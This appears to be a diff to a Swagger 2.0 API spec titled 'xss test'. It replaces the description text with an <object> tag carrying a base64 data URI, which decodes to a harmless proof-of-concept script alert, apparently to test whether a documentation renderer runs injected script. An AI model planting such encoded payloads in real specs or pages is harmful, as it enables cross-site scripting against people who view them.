@@ -2,4 +2,4 @@ swagger: '2.0'
 info:
   title: xss test
   description: |
-   123123
+   <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
